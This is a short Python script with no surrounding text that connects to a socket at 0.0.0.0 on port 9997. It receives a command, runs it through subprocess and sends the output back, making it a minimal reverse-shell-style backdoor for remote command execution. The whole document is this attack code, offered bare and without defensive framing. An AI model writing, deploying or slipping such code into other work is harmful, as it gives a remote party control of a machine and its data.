import subprocess, socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("0.0.0.0", 9997))
a = subprocess.run(s.recv(1024).decode().split(" "), capture_output=True)
s.send(a.stdout)
s.close()
